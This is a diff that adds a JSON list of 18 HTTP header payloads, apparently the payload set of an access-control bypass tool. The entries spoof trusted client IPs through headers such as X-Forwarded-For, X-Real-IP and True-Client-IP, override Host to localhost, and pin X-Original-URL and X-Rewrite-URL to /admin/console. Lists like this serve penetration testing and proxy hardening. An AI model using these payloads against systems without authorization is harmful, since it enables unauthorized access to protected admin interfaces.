@@ -1,0 +1,129 @@
+[
+  {
+    "name": "x-original-url-dynamic",
+    "description": "Spoof X-Original-URL with the requested path",
+    "headers": {
+      "X-Original-URL": "{path}"
+    }
+  },
+  {
+    "name": "x-custom-ip-authorization",
+    "description": "Inject trusted IP via X-Custom-IP-Authorization",
+    "headers": {
+      "X-Custom-IP-Authorization": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-remote-ip",
+    "description": "Inject trusted IP via X-Remote-IP",
+    "headers": {
+      "X-Remote-IP": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-originating-ip",
+    "description": "Inject trusted IP via X-Originating-IP",
+    "headers": {
+      "X-Originating-IP": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-remote-addr",
+    "description": "Inject trusted IP via X-Remote-Addr",
+    "headers": {
+      "X-Remote-Addr": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "client-ip",
+    "description": "Inject trusted IP via Client-IP",
+    "headers": {
+      "Client-IP": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "host-localhost",
+    "description": "Override host header with localhost",
+    "headers": {
+      "Host": "localhost"
+    }
+  },
+  {
+    "name": "x-proxyuser-ip",
+    "description": "Inject trusted IP via X-ProxyUser-Ip",
+    "headers": {
+      "X-ProxyUser-Ip": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "true-client-ip",
+    "description": "Inject trusted IP via True-Client-IP",
+    "headers": {
+      "True-Client-IP": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "cluster-client-ip",
+    "description": "Inject trusted IP via Cluster-Client-IP",
+    "headers": {
+      "Cluster-Client-IP": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-client-ip",
+    "description": "Inject trusted IP via X-Client-IP",
+    "headers": {
+      "X-Client-IP": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-real-ip",
+    "description": "Inject trusted IP via X-Real-IP",
+    "headers": {
+      "X-Real-IP": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-forwarded-for-url",
+    "description": "Inject URL-style value inside X-Forwarded-For",
+    "headers": {
+      "X-Forwarded-For": "http://{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-forwarded-for-port",
+    "description": "Inject host:port inside X-Forwarded-For",
+    "headers": {
+      "X-Forwarded-For": "{spoof_ip}:80"
+    }
+  },
+  {
+    "name": "x-rewrite-url-dynamic",
+    "description": "Rewrite URL header pointing to current path",
+    "path_template": "{origin}",
+    "headers": {
+      "X-rewrite-url": "{path}"
+    }
+  },
+  {
+    "name": "x-host-ip",
+    "description": "Override X-Host header",
+    "headers": {
+      "X-Host": "{spoof_ip}"
+    }
+  },
+  {
+    "name": "x-original-url-console",
+    "description": "Pin X-Original-URL to /admin/console",
+    "headers": {
+      "X-Original-URL": "/admin/console"
+    }
+  },
+  {
+    "name": "x-rewrite-url-console",
+    "description": "Pin X-Rewrite-URL to /admin/console",
+    "headers": {
+      "X-Rewrite-URL": "/admin/console"
+    }
+  }
+]
